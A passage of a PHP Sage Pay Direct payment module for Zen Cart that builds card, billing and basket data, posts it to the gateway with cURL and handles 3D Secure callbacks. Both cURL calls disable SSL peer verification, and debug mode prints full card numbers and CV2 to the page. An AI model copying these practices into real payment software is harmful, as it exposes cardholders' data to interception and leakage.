					$apply_avs_cv2 = "3";
					break;
			}
			
			// 3D Secure Settings
			switch (MODULE_PAYMENT_SAGE_PAY_DIRECT_3D_SECURE_SETTINGS) {
				case "If 3D-Secure checks are possible and rules allow, perform the checks and apply the authorisation rules. (Default)":
					$apply_3d_secure = "0";
					break;
				case "Force 3D-Secure checks (if your account is 3D-enabled) and apply rules for authorisation.":
					$apply_3d_secure = "1";
					break;
				case "Do not perform 3D-Secure checks, even if enabled on account - always authorise.":
					$apply_3d_secure = "2";
					break;
				case "Force 3D-Secure checks (if your account is 3D-enabled) but ALWAYS obtain an auth code, irrespective of rule base.":
					$apply_3d_secure = "3";
					break;
			}
			
			// Determine if the amount to be charged should be charged in the currently selected
			// currency or the Shop Prices' Base Currency
			$currency_amount = 0;
			$currency_code = '';
			
			// Get the current currency in which the customer is viewing prices
			$current_view_currency = $_SESSION['currency'];
			
			// Check if this currency can be accepted by the Shop
			$accepted_currencies_for_transactions =
				explode(',', MODULE_PAYMENT_SAGE_PAY_DIRECT_ACCEPTED_CURRENCIES);
			
			if (in_array($current_view_currency, $accepted_currencies_for_transactions)) {
				// The current currency has an associated Merchant Account and so can be used
				$currency_code = $current_view_currency;
				
				$currency_amount = number_format(($order->info['total']) *
					$currencies->get_value($currency_code), 2, '.', '');
			}
			
			if ($currency_code == '') {
				// Must carry out the transaction using the Default Merchant Account's currency
				$currency_code = MODULE_PAYMENT_SAGE_PAY_DIRECT_DEFAULT_CURRENCY;
				
				// Check if the currency used to enter all products prices (the shop's default
				// currency) matches the currency used by the Default Merchant Account
				if (DEFAULT_CURRENCY == $currency_code) {
					$currency_amount = number_format(($order->info['total']), 2, '.', '');
				} else {
					// The prices in the shop have not been entered in a currency for which a
					// merchant account exists. Must convert the order total to the currency used by
					// the default merchant account
					$currency_amount = number_format(($order->info['total']) *
						$currencies->get_value($currency_code), 2, '.', '');
				}
			}
			
			// Unique Transaction ID, max of 40 characters.  Format:  uTime - Customer ID - Random
			// Number. Store it in the session so it can be recorded against the order later.
			if (isset($_SESSION['sage_pay_direct_unique_transaction_id'])) {
				unset($_SESSION['sage_pay_direct_unique_transaction_id']);
			}
			
			list($usec, $sec) = explode(" ", microtime());
			$usec_part = substr($usec, 2, 6);
			$full_timestamp = $sec . $usec_part;
			
			$unique_transaction_id = substr($full_timestamp . '-' . 
				$_SESSION['customer_id'] . '-' . mt_rand(), 0, 40);
			
			// Load custom transaction ID if it exists
			if (file_exists(DIR_FS_CATALOG. DIR_WS_MODULES .
					'payment/sage_pay_direct/vendor_tx_code.php')) {
				include_once(DIR_FS_CATALOG. DIR_WS_MODULES .
					'payment/sage_pay_direct/vendor_tx_code.php');
			}
			
			$unique_transaction_id = $this->_cleanString($unique_transaction_id, 'VendorTxCode');
			
			$_SESSION['sage_pay_direct_unique_transaction_id'] = $unique_transaction_id;
			
			$billing_address1 = $order->billing['street_address'];
			$billing_postcode = $this->_cleanString($order->billing['postcode']);
			if (strlen($billing_postcode) == 0) {
				// Provide default postcode to prevent problems in countries where postcodes may not
				// apply
				$billing_postcode = 'none';
			}
			
			// Override the billing address if necessary in test mode
			if ((MODULE_PAYMENT_SAGE_PAY_DIRECT_TRANSACTION_MODE == 'Test' ||
					MODULE_PAYMENT_SAGE_PAY_DIRECT_TRANSACTION_MODE == 'Simulator' ||
					MODULE_PAYMENT_SAGE_PAY_DIRECT_TRANSACTION_MODE == 'IP Address Check') &&
					$_POST['use_test_billing_address'] == true) {
				$billing_address1 = SAGE_PAY_DIRECT_DEFAULT_BILLING_ADDRESS;
				$billing_postcode = SAGE_PAY_DIRECT_DEFAULT_POSTCODE;
			}
			
			// Populate an array that contains all of the data to be sent to Sage Pay
			$submit_data = array(
				'VPSProtocol' => '2.23',
				'TxType' => $auth_type, // Transaction Type
				'Vendor' => MODULE_PAYMENT_SAGE_PAY_DIRECT_VENDOR_NAME, // Vendor Login ID
				'VendorTxCode' => $unique_transaction_id,  // Unique Transaction ID
				'Amount' => $currency_amount,
				'Currency' => $this->_cleanString($currency_code),
				'Description' => substr($this->_cleanString(STORE_NAME .
					' - Zen Cart Order @ ' . date('Y-m-d H:i:s', time())), 0, 100),
				'CardHolder' => substr($this->_cleanString($_POST['card_owner'], 'CustomerName'), 0, 50),
				'CardNumber' => $this->_cleanString($_POST['card_number'], 'Number'),
				'ExpiryDate' => $this->_cleanString($_POST['card_expiry'], 'Number'),
				'CV2' => (isset($_POST['card_cvv']) ? $this->_cleanString($_POST['card_cvv'], 'Number') : ''),
				'CardType' => $this->_cleanString($_POST['card_type']),
				'BillingSurname' => substr($this->_cleanString($order->billing['lastname'], 'CustomerName'), 0, 20),
				'BillingFirstnames' => substr($this->_cleanString($order->billing['firstname'], 'CustomerName'), 0, 20),
				'BillingAddress1' => substr($this->_cleanString($billing_address1, 'Address'), 0, 100),
				'BillingAddress2' => substr($this->_cleanString($order->billing['suburb'], 'Address'), 0, 100),
				'BillingCity' => substr($this->_cleanString($order->billing['city'], 'City'), 0, 40),
				'BillingPostCode' => substr($this->_cleanString($billing_postcode, 'Postcode'), 0, 10),
				'BillingCountry' => substr($this->_cleanString($order->billing['country']['iso_code_2']), 0, 2),
				'BillingPhone' => substr($this->_cleanString($order->customer['telephone'], 'Telephone'), 0, 20),
				'CustomerEmail' => substr($this->_cleanString($order->customer['email_address']), 0, 255),
				//	  'GiftAidPayment' => '',
				'ApplyAVSCV2' => $apply_avs_cv2,
				'Apply3DSecure' => $apply_3d_secure,
				'ClientIPAddress' => $_SERVER['REMOTE_ADDR']
				);
			
			// Virtual products don't have a delivery address so use the billing address if the
			// delivery address doesn't exist
			if (!is_null($order->delivery['street_address'])) {
				$delivery_postcode = $this->_cleanString($order->delivery['postcode']);
				if (strlen($delivery_postcode) == 0) {
					// Provide default postcode to prevent problems in countries where postcodes
					// may not apply
					$delivery_postcode = 'none';
				}
				
				$submit_data['DeliverySurname'] = substr($this->_cleanString($order->delivery['lastname'], 'CustomerName'), 0, 20);
				$submit_data['DeliveryFirstnames'] = substr($this->_cleanString($order->delivery['firstname'], 'CustomerName'), 0, 20);
				$submit_data['DeliveryAddress1'] = substr($this->_cleanString($order->delivery['street_address'], 'Address'), 0, 100);
				$submit_data['DeliveryAddress2'] = substr($this->_cleanString($order->delivery['suburb'], 'Address'), 0, 100);
				$submit_data['DeliveryCity'] = substr($this->_cleanString($order->delivery['city'], 'City'), 0, 40);
				$submit_data['DeliveryPostCode'] = substr($this->_cleanString($delivery_postcode, 'Postcode'), 0, 10);
				$submit_data['DeliveryCountry'] =
					substr($this->_cleanString($order->delivery['country']['iso_code_2']), 0, 2);
				$submit_data['DeliveryPhone'] = substr($this->_cleanString($order->customer['telephone'], 'Telephone'), 0, 20);
			} else {
				$submit_data['DeliverySurname'] = substr($this->_cleanString($order->billing['lastname'], 'CustomerName'), 0, 20);
				$submit_data['DeliveryFirstnames'] = substr($this->_cleanString($order->billing['firstname'], 'CustomerName'), 0, 20);
				$submit_data['DeliveryAddress1'] = substr($this->_cleanString($billing_address1, 'Address'), 0, 100);
				$submit_data['DeliveryAddress2'] = substr($this->_cleanString($order->billing['suburb'], 'Address'), 0, 100);
				$submit_data['DeliveryCity'] = substr($this->_cleanString($order->billing['city'], 'City'), 0, 40);
				$submit_data['DeliveryPostCode'] = substr($this->_cleanString($billing_postcode, 'Postcode'), 0, 10);
				$submit_data['DeliveryCountry'] =
					substr($this->_cleanString($order->billing['country']['iso_code_2']), 0, 2);
				$submit_data['DeliveryPhone'] = substr($this->_cleanString($order->customer['telephone'], 'Telephone'), 0, 20);
			}
			
			// State is required for US customers
			if (strtoupper($order->billing['country']['iso_code_2']) == 'US') {
				$state_code = $this->_getUSStateCode($order->billing['zone_id'],
					$order->billing['state']);
				
				if ($state_code === false) {
					// Redirect back to payment page and display error message
					$error = $this->_encodeErrorMessage(sprintf(
						MODULE_PAYMENT_SAGE_PAY_DIRECT_TEXT_BILLING_STATE_PROBLEM,
						$order->billing['state']));
					$payment_error_return = 'payment_error=' . $this->code . '&error=' .
						urlencode($error);
					
					zen_redirect(zen_href_link(FILENAME_CHECKOUT_PAYMENT, $payment_error_return,
						'SSL', true, false));
				}
				
				$submit_data['BillingState'] = substr($state_code, 0, 2);
				
				if (is_null($order->delivery['street_address'])) {
					$submit_data['DeliveryState'] = substr($state_code, 0, 2);
				}
			}
			if (!is_null($order->delivery['street_address']) &&
					strtoupper($order->delivery['country']['iso_code_2']) == 'US') {
				$state_code = $this->_getUSStateCode($order->delivery['zone_id'],
					$order->delivery['state']);
				
				if ($state_code === false) {
					// Redirect back to payment page and display error message
					$error = $this->_encodeErrorMessage(sprintf(
						MODULE_PAYMENT_SAGE_PAY_DIRECT_TEXT_DELIVERY_STATE_PROBLEM,
						$order->delivery['state']));
					$payment_error_return = 'payment_error=' . $this->code . '&error=' .
						urlencode($error);
					
					zen_redirect(zen_href_link(FILENAME_CHECKOUT_PAYMENT, $payment_error_return,
						'SSL', true, false));
				}
				
				$submit_data['DeliveryState'] = substr($state_code, 0, 2);
			}
			
			// Check if start date should be passed or not
			if ($this->_showStartDate() && $this->_cardTypeUsesStartDate($_POST['card_type']) &&
					strlen($_POST['card_start']) == 4) {
				$submit_data['StartDate'] = $this->_cleanString($_POST['card_start'], 'Number');
			}
			
			// Check if issue number should be passed or not
			if ($this->_showIssueNumber() && $this->_cardTypeUsesIssueNumber($_POST['card_type']) &&
					strlen(trim($_POST['card_issue'])) > 0) {
				$submit_data['IssueNumber'] = $this->_cleanString($_POST['card_issue'], 'Number');
			}
			
			if (MODULE_PAYMENT_SAGE_PAY_DIRECT_SHOPCART == 'Yes') {
				// Add details about the items in the shopping cart
				$cart_string = '';
				
				$number_of_lines = 0;
				
				// Following code could simply use $currencies->format($VALUE, true, $currency_code)
				// but doesn't in order to allow for manual checking of validity of decimal point
				// code etc. entered by customer for the various currencies
				
				// Pattern to remove any invalid characters from values
				$pattern = '|[&]*[:]*[,]*|';
				
				$currency_decimal_point = $currencies->currencies[$currency_code]['decimal_point'];
				$currency_thousands_point =
					$currencies->currencies[$currency_code]['thousands_point'];
				$currency_decimal_places =
					$currencies->currencies[$currency_code]['decimal_places'];
				$currency_symbol_left = $currencies->currencies[$currency_code]['symbol_left'];
				$currency_symbol_right = $currencies->currencies[$currency_code]['symbol_right'];
				
				$currency_decimal_point = preg_replace($pattern, '', $currency_decimal_point);
				if (strlen($currency_decimal_point) == 0) {
					$currency_decimal_point = '.';
				}
				
				$currency_thousands_point = preg_replace($pattern, '', $currency_thousands_point);
				if (strlen($currency_thousands_point) == 0) {
					$currency_thousands_point = '';
				}
				
				switch (trim($currency_symbol_left)) {
					/*case '&pound;':
						$currency_symbol_left = '£';
						break;*/
					case '$':
						$currency_symbol_left = '$';
						break;
					/*case '&yen;':
						$currency_symbol_left = '¥';
						break;*/
					default:
						$currency_symbol_left = '';
				}
				$currency_symbol_right = preg_replace($pattern, '', $currency_symbol_right);
				
				for ($i = 0, $n = sizeof($order->products); $i < $n; $i++) {			
					if (MODULE_PAYMENT_SAGE_PAY_DIRECT_SHOPCART_ADD_MODEL_NUM == 'Yes'
							&& strlen($order->products[$i]['model']) > 0) {		
						$description = $order->products[$i]['name'] . ' (' .
							$order->products[$i]['model'] . ')';
					} else {
						$description = $order->products[$i]['name'];
					}
					if (isset($order->products[$i]['attributes']) &&
							sizeof($order->products[$i]['attributes']) > 0 ) {
						$description .= '<br>';
						for ($j = 0, $n2 = sizeof($order->products[$i]['attributes']); $j < $n2;
								$j++) {
							$description .= ' // ' . str_replace("\n", '',
								$order->products[$i]['attributes'][$j]['option'] . ' -- ' .
								$this->_cleanString(
								$order->products[$i]['attributes'][$j]['value']));
						}
					}
					
					$qty = $this->_cleanString($order->products[$i]['qty'], 'Number');
					$final_price_exc_tax = $order->products[$i]['final_price'];
					$tax = zen_calculate_tax($final_price_exc_tax, $order->products[$i]['tax']);
					$final_price_inc_tax = zen_round($final_price_exc_tax,
						$currencies->currencies[DEFAULT_CURRENCY]['decimal_places']) + $tax;
					// Get the total for this product and quantity (including any one time charges)
					$onetime_charges_inc_tax = 0;
					if ($order->products[$i]['onetime_charges'] != 0) {
						$onetime_charges_inc_tax = zen_round(
							$order->products[$i]['onetime_charges'],
							$currencies->currencies[DEFAULT_CURRENCY]['decimal_places']) +
							zen_calculate_tax($order->products[$i]['onetime_charges'],
							$order->products[$i]['tax']);
					}
					$line_total = ($qty * $final_price_inc_tax) + $onetime_charges_inc_tax;
					
					// Make sure only valid characters are used for the cart's details
					$description = $this->_cleanString($description); 
					$pattern = '|[&]*[:]*|';
					$description_formatted = preg_replace($pattern, '', $description);
					
					// Adjust prices for currency being used to process the transaction
					$final_price_exc_tax = $final_price_exc_tax *
						$currencies->get_value($currency_code);
					$tax = $tax * $currencies->get_value($currency_code);
					$final_price_inc_tax = $final_price_inc_tax *
						$currencies->get_value($currency_code);
					$line_total = $line_total * $currencies->get_value($currency_code);
					
					$final_price_exc_tax_formatted = $currency_symbol_left . number_format(
						$final_price_exc_tax, $currency_decimal_places, $currency_decimal_point,
						$currency_thousands_point) . $currency_symbol_right;
					$tax_formatted = $currency_symbol_left . number_format($tax,
						$currency_decimal_places, $currency_decimal_point,
						$currency_thousands_point) . $currency_symbol_right;
					$final_price_inc_tax_formatted = $currency_symbol_left . number_format(
						$final_price_inc_tax, $currency_decimal_places, $currency_decimal_point,
						$currency_thousands_point) . $currency_symbol_right;
					$line_total_formatted = $currency_symbol_left . number_format($line_total,
						$currency_decimal_places, $currency_decimal_point,
						$currency_thousands_point) . $currency_symbol_right;
					
					// Add this product to the encoded list of products
					$product_string = ":" . $description_formatted . ":" . $qty . ":" .
						$final_price_exc_tax_formatted . ":" . $tax_formatted . ":" .
						$final_price_inc_tax_formatted . ":" . $line_total_formatted;
					
					if ((strlen($cart_string) + strlen($product_string)) < 7430) {
						$cart_string .= $product_string;
						$number_of_lines++;
					} else {
						// Can't exceed limits for cart string
						break;
					}
				}
				
				// Calculate the tax included in the shipping (if any)
				$module = substr($_SESSION['shipping']['id'], 0,
					strpos($_SESSION['shipping']['id'], '_'));
				if (zen_not_null($order->info['shipping_method'])) {
					if ($GLOBALS[$module]->tax_class > 0) {
						if (!defined($GLOBALS[$module]->tax_basis)) {
							$shipping_tax_basis = STORE_SHIPPING_TAX_BASIS;
						} else {
							$shipping_tax_basis = $GLOBALS[$module]->tax_basis;
						}
						
						if ($shipping_tax_basis == 'Billing') {
							$shipping_tax = zen_get_tax_rate($GLOBALS[$module]->tax_class,
								$order->billing['country']['id'], $order->billing['zone_id']);
						} elseif ($shipping_tax_basis == 'Shipping') {
							$shipping_tax = zen_get_tax_rate($GLOBALS[$module]->tax_class,
								$order->delivery['country']['id'], $order->delivery['zone_id']);
						} else {
							if (STORE_ZONE == $order->billing['zone_id']) {
								$shipping_tax = zen_get_tax_rate($GLOBALS[$module]->tax_class,
									$order->billing['country']['id'], $order->billing['zone_id']);
							} elseif (STORE_ZONE == $order->delivery['zone_id']) {
								$shipping_tax = zen_get_tax_rate($GLOBALS[$module]->tax_class,
									$order->delivery['country']['id'], $order->delivery['zone_id']);
							} else {
								$shipping_tax = 0;
							}
						}
					}
				}
				
				if (DISPLAY_PRICE_WITH_TAX == 'true') {
					$shipping_inc_tax = $order->info['shipping_cost'];
					$shipping_exc_tax = zen_round($shipping_inc_tax / (1 + ($shipping_tax / 100)),
						$currencies->currencies[DEFAULT_CURRENCY]['decimal_places']);
					$shipping_tax = $shipping_inc_tax - $shipping_exc_tax;
				} else {
					$shipping_exc_tax = $order->info['shipping_cost'];
					$shipping_tax = zen_calculate_tax($shipping_exc_tax, $shipping_tax);
					$shipping_inc_tax = zen_round($shipping_exc_tax,
						$currencies->currencies[DEFAULT_CURRENCY]['decimal_places']) +
						$shipping_tax;
				}
				
				// Adjust prices for currency being used to process the transaction
				$shipping_inc_tax = $shipping_inc_tax * $currencies->get_value($currency_code);
				$shipping_tax = $shipping_tax * $currencies->get_value($currency_code);
				$shipping_exc_tax = $shipping_exc_tax * $currencies->get_value($currency_code);
				
				$shipping_inc_tax_formatted = $currency_symbol_left .
					number_format($shipping_inc_tax, $currency_decimal_places,
					$currency_decimal_point, $currency_thousands_point);
				$shipping_tax_formatted = $currency_symbol_left .
					number_format($shipping_tax, $currency_decimal_places,
					$currency_decimal_point, $currency_thousands_point);
				$shipping_exc_tax_formatted = $currency_symbol_left .
					number_format($shipping_exc_tax, $currency_decimal_places,
					$currency_decimal_point, $currency_thousands_point);
				
				$shipping_string = ":Shipping:1:" . $shipping_exc_tax_formatted . ':' .
					$shipping_tax_formatted . ':' . $shipping_inc_tax_formatted . ":" .
					$shipping_inc_tax_formatted;
				
				if ((strlen($cart_string) + strlen($shipping_string)) < 7497) {
					$cart_string .= $shipping_string;
					$number_of_lines++;
				}
				
				// Remove any newlines and carriage returns
				$cart_string = str_replace("\n", '', $cart_string);
				$cart_string = str_replace("\r", '', $cart_string);
				
				$submit_data['Basket'] = $number_of_lines . $cart_string;
			}
			
			// Concatenate the submission data and put into variable $data
			$data = '';
			while (list($key, $value) = each($submit_data)) {
				$data .= $key . '=' . urlencode($value) . '&';
			}
			
			// Remove the last "&" from the string
			$data = substr($data, 0, -1);
			
			// RECORD TRANSACTION //////////////////////////////////////////////////////////////////
			// Record the details for this transaction in case something goes wrong and the customer
			// isn't returned by Sage Pay correctly after it has processed the transaction... allows
			// for the ability to warn of, and prevent, duplicate transactions
			
			// (TO BE ADDED) ///////
			
			// SEND DATA ///////////////////////////////////////////////////////////////////////////
			// Post order info data to Sage Pay. (Will fail if curl is not installed)
			
			switch (MODULE_PAYMENT_SAGE_PAY_DIRECT_TRANSACTION_MODE) {
				case 'Live':
					$url = 'https://live.sagepay.com/gateway/service/vspdirect-register.vsp';
					break;
				case 'Test':
					$url = 'https://test.sagepay.com/gateway/service/vspdirect-register.vsp';
					break;
				case 'Simulator':
					$url = 'https://test.sagepay.com/Simulator/VSPDirectGateway.asp';
					break;
				case 'IP Address Check':
					$url = 'https://test.sagepay.com/showpost/showpost.asp';
					break;
			}
			
			// Allow for a one-minute timeout for the attempt to connect to Sage Pay
			if (ini_get('safe_mode') != 1) {
				set_time_limit(70);
				$curl_timeout = 60;
			} else {
				// Can't set a specific timeout, check what can be set!
				$max_timeout = ini_get('max_execution_time');
				$curl_timeout = $max_timeout - 5;
			}
			
			$ch = curl_init();
			curl_setopt($ch, CURLOPT_URL, $url);
			curl_setopt($ch, CURLOPT_HEADER, 0);
			curl_setopt($ch, CURLOPT_POST, 1);
			curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
			curl_setopt($ch, CURLOPT_TIMEOUT, $curl_timeout);
			curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 1);
			curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
			curl_setopt($ch, CURLOPT_DNS_USE_GLOBAL_CACHE, 0);
			curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
			
			$sage_pay_response = curl_exec($ch);
			
			curl_close ($ch);
			
			if ($sage_pay_response == false) {
				// cURL command didn't work. cURL not installed?
				if (MODULE_PAYMENT_SAGE_PAY_DIRECT_DEBUGGING_ENABLED != 'Yes') {
					// Redirect back to payment page and display error message
					$error = $this->_encodeErrorMessage(
						MODULE_PAYMENT_SAGE_PAY_DIRECT_TEXT_CURL_PROBLEM);
					$payment_error_return = 'payment_error=' . $this->code . '&error=' .
						urlencode($error);
					
					zen_redirect(zen_href_link(FILENAME_CHECKOUT_PAYMENT, $payment_error_return,
						'SSL', true, false));
				} else {
					// Debug mode is enabled so allow the debug information to be output later using
					// dummy values where appropriate
					$this->_sage_pay_return_values = "cURL Failed so no return values processed!";
					
					// Record temporary copy of returned string for debug purposes
					$unprocessed_sage_pay_response = $sage_pay_response;
				}
			} else {
				// Contacted Sage Pay successfully!
				
				// If this is a simple IP address check then output the information
				if (MODULE_PAYMENT_SAGE_PAY_DIRECT_TRANSACTION_MODE == 'IP Address Check') {
					print $sage_pay_response;
					exit;
				}
				
				// Record temporary copy of returned string for debug purposes
				$unprocessed_sage_pay_response = $sage_pay_response;
				
				// Parse Sage Pay response string and store returned values
				$this->_sage_pay_return_values = $this->_parseSagePayResponse($sage_pay_response);
			}
			
			// Debugging output
			if (MODULE_PAYMENT_SAGE_PAY_DIRECT_DEBUGGING_ENABLED == 'Yes') {
				echo "<html><head><title>Sage Pay Direct Debug Output</title></head><body>\n";
				echo "<pre>\n\n";
				echo "Data was sent to URL:\n\n$url \n\n";
				echo "-------------------------------------\n";
				echo "Unprocessed Data received from Sage Pay:\n";
				echo "-------------------------------------\n";
				echo $unprocessed_sage_pay_response . "\n";
				echo "------------------------------------------\n";
				echo "Data received from Sage Pay after processing:\n";
				echo "------------------------------------------\n";
				var_dump($this->_sage_pay_return_values);
				echo "\n----------------------------\n";
				echo "Original Data sent to Sage Pay:\n";
				echo "----------------------------\n";
				echo $data . "\n";
				echo "\n----------------------------\n";
				echo "Formatted version of Data sent to Sage Pay:\n";
				echo "----------------------------\n";
				echo var_dump($submit_data);
				echo "----------------------------\n\n";
				
				if (MODULE_PAYMENT_SAGE_PAY_DIRECT_STORE_DETAILS_IN_SESSION == 'Yes') {
					if (MODULE_PAYMENT_SAGE_PAY_DIRECT_USE_BLOWFISH == 'Yes' &&
							ceon_file_exists_in_include_path('Crypt/Blowfish.php') ==
							CEON_FILE_EXISTS_IN_INCLUDE_PATH__EXISTS &&
							ceon_file_exists_in_include_path('PEAR.php') ==
							CEON_FILE_EXISTS_IN_INCLUDE_PATH__EXISTS) {
						echo "-----------------------------\n";
						echo "Blowfish Encryption was used.\n";
						echo "-----------------------------\n\n";
					} else {
						echo "--------------------\n";
						echo "Encryption NOT USED!\n";
						echo "--------------------\n\n";
					}
				} else {
					echo "----------------------------------------------------------------\n";
					echo "Details not being stored in session so encryption not necessary.\n";
					echo "----------------------------------------------------------------\n\n";
				}
				
				// Output the include path details
				echo "------------------------------\n";
				echo "Include paths for this system:\n";
				echo "------------------------------\n\n";
				echo get_include_path() . "\n\n";
				
				echo "----------------------\n";
				echo "Safe mode in use?: " . (ini_get('safe_mode') == 1 ? 'yes' : 'no') . "\n";
				echo "----------------------\n\n";
				
				echo "------------------------------------\n";
				echo "open_basedir restricted directories:\n";
				echo "------------------------------------\n\n";
				echo ini_get('open_basedir') . "\n\n";
				
				echo "\n-------------------\n";
				echo "Transaction status:\n";
				echo "-------------------\n";
				if ($this->_sage_pay_return_values['Status'] == 'OK' ||
						$this->_sage_pay_return_values['Status'] == 'REGISTERED' ||
						$this->_sage_pay_return_values['Status'] == 'AUTHENTICATED') {
					echo "Transaction was successful!\n";
				} else if ($this->_sage_pay_return_values['Status'] == '3DAUTH') {
					echo "3D Secure Authentication Required!\n";
				} else {
					echo "Transaction denied!\n";
					echo $this->_sage_pay_return_values['StatusDetail'] . "\n";
				}
				echo "\n\n</pre>\n</body>\n</html>";
				
				exit;
			}
			
			// Check what action must take place
			if ($this->_sage_pay_return_values['Status'] == 'OK' ||
					$this->_sage_pay_return_values['Status'] == 'REGISTERED' ||
					$this->_sage_pay_return_values['Status'] == 'AUTHENTICATED') {
				// Transaction has gone through okay, let Zen Cart create the order etc.
				
			} else if ($this->_sage_pay_return_values['Status'] == '3DAUTH') {
				// 3D-Secure authorisation is required
				// Must build message and form or auto-submitting form to redirect customer to
				// Card Issuer's website for entering of 3D-Secure authorisation details!
				
				// Store card details so they can be recorded against the order later
				$_SESSION['sage_pay_direct_order_card_details'] = array(
					'cc_number' => $order->info['cc_number'],
					'cc_expires' => $order->info['cc_expires'],
					'cc_type' => $order->info['cc_type'],
					'cc_owner' => $order->info['cc_owner']
					);
				
				if ($this->_showStartDate()) {
					$_SESSION['sage_pay_direct_order_card_details']['cc_start'] =
						$_POST['card_start'];
				} else if (isset($_SESSION['sage_pay_direct_order_card_details']['cc_start'])) {
					unset($_SESSION['sage_pay_direct_order_card_details']['cc_start']);
				}
				if ($this->_showIssueNumber()) {
					$_SESSION['sage_pay_direct_order_card_details']['cc_issue'] =
						$_POST['card_issue'];
				} else if (isset($_SESSION['sage_pay_direct_order_card_details']['cc_issue'])) {
					unset($_SESSION['sage_pay_direct_order_card_details']['cc_issue']);
				}
				
				// Redirect to the Sage Pay Direct 3D-Secure output page/template
				$checkout_3d_secure_parameters = 'ACSURL=' . urlencode(
					$this->_sage_pay_return_values['ACSURL']) .
					'&PaReq=' . urlencode($this->_sage_pay_return_values['PAReq']) .
					'&MD=' . urlencode($this->_sage_pay_return_values['MD']);
				
				zen_redirect(zen_href_link(FILENAME_CHECKOUT_SAGE_PAY_DIRECT_3D_SECURE,
					$checkout_3d_secure_parameters, 'SSL', true, false));
			} else {
				// Redirect back to the payment page with the appropriate error message
				$error_message = $this->_identifyErrorMessage(
					$this->_sage_pay_return_values['Status'],
					$this->_sage_pay_return_values['StatusDetail']);
				
				$error_message = $this->_encodeErrorMessage($error_message);
				$payment_error_return = 'payment_error=' . $this->code . '&error=' . urlencode(
					sprintf($error_message, $this->_sage_pay_return_values['StatusDetail']));
				zen_redirect(zen_href_link(FILENAME_CHECKOUT_PAYMENT, $payment_error_return, 'SSL',
					true, false));
			}
		} else {
			// Method has been called as a callback from a bank after the customer has entered
			// their 3D secure details, must forward these details on to Sage Pay //////////////////
			
			// Restore the card details for the order so they can be recorded against it
			foreach ($_SESSION['sage_pay_direct_order_card_details'] as $key => $value) {
				$order->info[$key] = $value;
			}
			unset($_SESSION['sage_pay_direct_order_card_details']);
			
			
			switch (MODULE_PAYMENT_SAGE_PAY_DIRECT_TRANSACTION_MODE) {
				case 'Live':
					$url = 'https://live.sagepay.com/gateway/service/direct3dcallback.vsp';
					break;
				case 'Test':
					$url = 'https://test.sagepay.com/gateway/service/direct3dcallback.vsp';
					break;
				case 'Simulator':
					$url = 'https://test.sagepay.com/Simulator/VSPDirectCallback.asp';
					break;
			}
			
			// Populate an array that contains all of the data to be sent to Sage Pay
			$submit_data = array(
				'MD' => $_POST['MD'],
				'PARes' => $_POST['PaRes']
				);
			
			// Concatenate the submission data and put into variable $data
			$data = '';
			while (list($key, $value) = each($submit_data)) {
				$data .= $key . '=' . urlencode($value) . '&';
			}
			
			// Remove the last "&" from the string
			$data = substr($data, 0, -1);
			
			// Allow for a one-minute timeout for the attempt to connect to Sage Pay
			if (ini_get('safe_mode') != 1) {
				set_time_limit(70);
				$curl_timeout = 60;
			} else {
				// Can't set a specific timeout, check what can be set!
				$max_timeout = ini_get('max_execution_time');
				$curl_timeout = $max_timeout - 5;
			}
			
			$ch = curl_init();
			curl_setopt($ch, CURLOPT_URL, $url);
			curl_setopt($ch, CURLOPT_HEADER, 0);
			curl_setopt($ch, CURLOPT_POST, 1);
			curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
			curl_setopt($ch, CURLOPT_TIMEOUT, $curl_timeout);
			curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 1);
			curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
			curl_setopt($ch, CURLOPT_DNS_USE_GLOBAL_CACHE, 0);
			curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
			
			$sage_pay_response = curl_exec($ch);
			
			curl_close ($ch);
			
			if ($sage_pay_response == false) {
				// cURL command didn't work. cURL not installed?
				
				// Redirect back to payment page and display error message
				$error_message = $this->_encodeErrorMessage(
					MODULE_PAYMENT_SAGE_PAY_DIRECT_TEXT_CURL_PROBLEM);
				$payment_error_return = 'payment_error=' . $this->code . '&error=' .
					urlencode($error_message);
				
				zen_redirect(zen_href_link(FILENAME_CHECKOUT_PAYMENT, $payment_error_return, 'SSL',
					true, false));
			} else {
				// Contacted Sage Pay successfully!
				
				// Parse Sage Pay response string and store returned values
				$this->_sage_pay_return_values = $this->_parseSagePayResponse($sage_pay_response);
				
				// Check what action must take place
				if ($this->_sage_pay_return_values['Status'] == 'OK' ||
						$this->_sage_pay_return_values['Status'] == 'REGISTERED' ||
						$this->_sage_pay_return_values['Status'] == 'AUTHENTICATED') {
					// Transaction has gone through, although 3D Secure may not have been able to
					// have been checked/completed. Regardless, must let Zen Cart create the order
					return;
				} else if ($this->_sage_pay_return_values['Status'] == '3DAUTH') {
					switch ($this->_sage_pay_return_values['3DSecureStatus']) {
						case 'NOAUTH':
						case 'CANTAUTH':
						case 'ATTEMPTONLY':
							// Card or Card Issuer is not part of the 3D-Secure scheme but all
							// other card details were okay. Let Zen Cart create the order.
							return;
							break; // Will never get here :)
						case 'MALFORMED':
						case 'INVALID':
							// The module is not functioning properly or has not been configured
							// properly
							$error_message = MODULE_PAYMENT_SAGE_PAY_DIRECT_TEXT_INVALID_MESSAGE;
							break;
						case 'NOTAUTHED':
							// The customer didn't pass the 3D Secure checks!
							$error_message =
								MODULE_PAYMENT_SAGE_PAY_DIRECT_TEXT_3D_SECURE_NOTAUTHED_MESSAGE;
							break;
						case 'REJECTED':
							// Details haven't complied with the rules set up in the VSP admin
							$error_message =
								MODULE_PAYMENT_SAGE_PAY_DIRECT_TEXT_3D_SECURE_REJECTED_MESSAGE;
							break;
						case 'ERROR':
							// Serious Sage Pay error occurred. No chance of progressing at the
							// minute!
							$error_message = MODULE_PAYMENT_SAGE_PAY_DIRECT_TEXT_ERROR_MESSAGE;
							break;
						default:
							// The response code is not OK (approved), some sort of error occurred
							$error_message =
								MODULE_PAYMENT_SAGE_PAY_DIRECT_TEXT_3D_SECURE_DECLINED_MESSAGE;
					}
				} else {
					$error_message = $this->_identifyErrorMessage(
						$this->_sage_pay_return_values['Status'],
						$this->_sage_pay_return_values['StatusDetail']);
				}
				
				// Redirect back to the payment page with the appropriate error message
				$error_message = $this->_encodeErrorMessage($error_message);
